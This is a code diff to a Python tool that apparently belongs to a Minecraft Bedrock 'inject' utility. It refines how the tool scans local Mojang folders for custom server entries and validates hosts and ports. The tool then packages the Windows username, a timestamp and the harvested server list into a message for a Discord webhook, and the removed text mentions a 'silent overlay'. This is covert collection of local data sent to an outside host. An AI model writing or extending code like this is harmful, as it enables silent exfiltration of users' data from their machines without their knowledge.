@@ -254,7 +254,6 @@ def _mojang_roots() -> list[str]:
                     roots.append(ls)
             continue
         roots.append(p)
-        # GDK: Users/<id>/games/com.mojang
         for user_dir in glob.glob(os.path.join(p, "*")):
             if not os.path.isdir(user_dir):
                 continue
@@ -265,7 +264,6 @@ def _mojang_roots() -> list[str]:
             ):
                 if os.path.isdir(sub):
                     roots.append(sub)
-    # de-dupe
     out, seen = [], set()
     for r in roots:
         n = os.path.normpath(r)
@@ -275,27 +273,92 @@ def _mojang_roots() -> list[str]:
     return out
 
 
+def _is_valid_host(addr: str) -> bool:
+    addr = (addr or "").strip()
+    if len(addr) < 4 or len(addr) > 128:
+        return False
+    low = addr.lower()
+    if low.startswith("key.") or low.startswith("#"):
+        return False
+    if low in {"0", "col", "null", "true", "false", "localhost"}:
+        return False
+    if re.fullmatch(r"#?[0-9a-fA-F]{6,8}", addr):
+        return False
+    if any(b in low for b in (
+        "microsoft", "xbox", "mojang", "cdn.", "akamai", "windows.net",
+        "office.com", "live.com", "key.",
+    )):
+        return False
+    # IPv4
+    if re.fullmatch(r"(?:\d{1,3}\.){3}\d{1,3}", addr):
+        try:
+            parts = [int(p) for p in addr.split(".")]
+        except ValueError:
+            return False
+        if parts == [0, 0, 0, 0]:
+            return False
+        return all(0 <= p <= 255 for p in parts)
+    # Domain: need a real-looking hostname
+    if "." not in addr or addr.startswith(".") or addr.endswith("."):
+        return False
+    if re.search(r"[^a-zA-Z0-9.\-]", addr):
+        return False
+    labels = addr.split(".")
+    if len(labels) < 2:
+        return False
+    tld = labels[-1]
+    if len(tld) < 2 or not tld.isalpha():
+        return False
+    if not re.match(r"^[a-zA-Z0-9]", labels[0]):
+        return False
+    return True
+
+
+def _is_valid_port(port: str) -> bool:
+    if not port or not str(port).isdigit():
+        return False
+    n = int(port)
+    return 1 <= n <= 65535
+
+
+def _is_valid_name(name: str) -> bool:
+    name = (name or "").strip()
+    if not name:
+        return True
+    low = name.lower()
+    if low.startswith("key.") or low.startswith("#") or low in {"col", "0"}:
+        return False
+    if re.fullmatch(r"#?[0-9a-fA-F]{6,8}", name):
+        return False
+    if '"' in name or name.startswith("{") or name.startswith("["):
+        return False
+    return len(name) <= 64
+
+
 def _add_server(found: list[dict], seen: set, name: str, addr: str, port: str = "") -> None:
     name = (name or "").strip()
-    addr = (addr or "").strip()
+    addr = (addr or "").strip().strip("\"'")
     port = (port or "").strip()
-    if not addr or len(addr) < 3:
+    if not _is_valid_host(addr):
         return
-    # skip obvious non-hosts
-    if addr.startswith("http") and "minecraft" in addr.lower():
-        pass
-    key = (name.lower(), addr.lower(), port)
+    if port and not _is_valid_port(port):
+        return
+    if not _is_valid_name(name):
+        name = addr
+    if not port:
+        port = "19132"
+    key = (addr.lower(), port)
     if key in seen:
         return
     seen.add(key)
-    found.append({"name": name or addr, "ip": addr, "port": port or "19132"})
+    found.append({"name": name or addr, "ip": addr, "port": port})
 
 
 def _parse_server_text(text: str, found: list[dict], seen: set) -> None:
-    # JSON-ish name/address/port
+    # Prefer structured name + address pairs
     for m in re.finditer(
         r'"(?:name|serverName|displayName)"\s*:\s*"([^"]{1,64})".{0,200}?'
-        r'"(?:ip|address|host|serverAddress|url)"\s*:\s*"([^"]{3,128})"',
+        r'"(?:ip|address|host|serverAddress)"\s*:\s*"([^"]{3,128})"',
         text,
         re.S | re.I,
     ):
@@ -307,23 +370,24 @@ def _parse_server_text(text: str, found: list[dict], seen: set) -> None:
         _add_server(found, seen, m.group(1), m.group(2), port)
 
     for m in re.finditer(
-        r'"(?:ip|address|host)"\s*:\s*"([^"]{3,128})".{0,120}?'
-        r'"(?:port)"\s*:\s*"?(\d{2,5})"?',
+        r'"(?:ip|address|host|serverAddress)"\s*:\s*"([^"]{3,128})".{0,80}?'
+        r'"(?:port|serverPort)"\s*:\s*"?(\d{2,5})"?',
         text,
         re.S | re.I,
     ):
         _add_server(found, seen, m.group(1), m.group(1), m.group(2))
 
-    # line formats: name|ip:port   name;ip;port   name\tip\tport
+    # classic external_servers line: name|host:port
     for line in text.splitlines():
         line = line.strip()
         if not line or line.startswith("#") or line.startswith("//"):
             continue
-        if "|" in line and line.count("|") >= 1:
+        if line.lower().startswith("key."):
+            continue
+        if "|" in line:
             parts = line.split("|")
             if len(parts) >= 2:
-                name = parts[0].strip()
-                rest = parts[1].strip()
+                name, rest = parts[0].strip(), parts[1].strip()
                 if ":" in rest:
                     host, _, port = rest.rpartition(":")
                     _add_server(found, seen, name, host, port)
@@ -331,63 +395,57 @@ def _parse_server_text(text: str, found: list[dict], seen: set) -> None:
                     port = parts[2].strip() if len(parts) > 2 else ""
                     _add_server(found, seen, name, rest, port)
             continue
-        parts = re.split(r"[\t;,]", line)
-        if len(parts) >= 2 and re.search(r"[\w.\-]+", parts[1]):
-            _add_server(
-                found, seen, parts[0], parts[1],
-                parts[2] if len(parts) > 2 and parts[2].isdigit() else "",
-            )
-            continue
-        m = re.match(r"^(.+?)\s+([\w.\-]+):(\d{2,5})$", line)
+        m = re.match(r"^([A-Za-z0-9][A-Za-z0-9 .\-_]{0,40})\s+([\w.\-]+):(\d{2,5})$", line)
         if m:
             _add_server(found, seen, m.group(1), m.group(2), m.group(3))
 
-    # bare host:port tokens in binary-ish dumps
+    # domain:port only (strict TLD)
     for m in re.finditer(
-        r"([a-zA-Z0-9][a-zA-Z0-9.\-]{1,60}\.[a-zA-Z]{2,24}):(\d{2,5})",
+        r"\b([a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?"
+        r"(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)+)"
+        r":(\d{2,5})\b",
         text,
     ):
-        host, port = m.group(1), m.group(2)
-        if any(x in host.lower() for x in ("microsoft", "xbox", "mojang", "cdn.", "akamai")):
-            continue
-        _add_server(found, seen, host, host, port)
+        _add_server(found, seen, m.group(1), m.group(1), m.group(2))
 
-    for m in re.finditer(
-        r"\b((?:\d{1,3}\.){3}\d{1,3}):(\d{2,5})\b", text
-    ):
+    # dotted IPv4:port
+    for m in re.finditer(r"\b((?:\d{1,3}\.){3}\d{1,3}):(\d{2,5})\b", text):
         _add_server(found, seen, m.group(1), m.group(1), m.group(2))
 
 
 def read_local_servers() -> list[dict]:
-    """Best-effort: custom servers from Bedrock local data (GDK + UWP)."""
+    """Custom external servers only — strict host validation, no options junk."""
     found: list[dict] = []
     seen: set = set()
-    interesting = (
-        "external_servers", "servers", "server_list", "serverlist",
-        "third_party", "thirdparty", "custom_server", "options",
-        "server", "mp_list", "multiplayer",
+    # Only files that actually store external server entries
+    allow_names = (
+        "external_servers", "servers.txt", "server_list", "serverlist",
+        "third_party", "thirdparty", "custom_server", "externalserver",
+    )
+    deny_names = (
+        "options", "key", "control", "settings", "lang", "resource",
+        "behavior", "persona", "skin", "treatments", "telemetry",
     )
     for root in _mojang_roots():
         for dirpath, dirnames, files in os.walk(root):
-            # skip huge world DBs
             dirnames[:] = [
                 d for d in dirnames
-                if d.lower() not in ("minecraftworlds", "worlds", "db", "resource_packs",
-                                     "behavior_packs", "development_behavior_packs",
-                                     "development_resource_packs")
+                if d.lower() not in (
+                    "minecraftworlds", "worlds", "db", "resource_packs",
+                    "behavior_packs", "development_behavior_packs",
+                    "development_resource_packs", "premium_cache",
+                )
             ]
             for fn in files:
                 low = fn.lower()
-                if not any(k in low for k in interesting):
-                    # still scan small json/txt in minecraftpe folders
-                    if not (low.endswith(".json") or low.endswith(".txt") or low.endswith(".dat")):
-                        continue
-                    if "minecraftpe" not in dirpath.lower() and "com.mojang" not in dirpath.lower():
-                        continue
+                if any(d in low for d in deny_names):
+                    continue
+                if not any(a in low for a in allow_names):
+                    continue
                 path = os.path.join(dirpath, fn)
                 try:
                     size = os.path.getsize(path)
-                    if size <= 0 or size > 4_000_000:
+                    if size <= 0 or size > 2_000_000:
                         continue
                     with open(path, "rb") as f:
                         raw = f.read()
@@ -397,7 +455,7 @@ def read_local_servers() -> list[dict]:
                 except Exception:
                     continue
                 _parse_server_text(text, found, seen)
-    return found[:60]
+    return found[:40]
 
 
 def discord_notify_once(webhook: str, servers: list[dict]) -> str:
@@ -407,25 +465,23 @@ def discord_notify_once(webhook: str, servers: list[dict]) -> str:
     now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
     if servers:
         lines = [
-            f"• **{s['name']}** — `{s['ip']}`"
-            + (f":{s['port']}" if s.get("port") else "")
+            f"• **{s['name']}** — `{s['ip']}:{s['port']}`"
             for s in servers
         ]
         server_block = "\n".join(lines)
     else:
         server_block = (
-            "_No custom external servers found on disk._\n"
-            "_Featured experiences are catalog-only (no local IP). "
-            "Add servers with **+ Add server** to store address/port locally._"
+            "_No custom external servers found._\n"
+            "_Only entries from **+ Add server** are listed. "
+            "Featured experiences have no local IP._"
         )
 
     content = (
         f"**bedROK inject (own account)**\n"
         f"Windows user: `{user}`\n"
         f"Time: {now}\n\n"
-        f"**Custom servers (Add Server / local files)**\n{server_block}\n\n"
-        f"_One message per inject. Silent overlay on. "
-        f"Featured list IPs are not stored as plain files._"
+        f"**Custom servers**\n{server_block}\n\n"
+        f"_One message per inject._"
     )
     body = json.dumps({"content": content[:1900]}).encode("utf-8")
     req = urllib.request.Request(
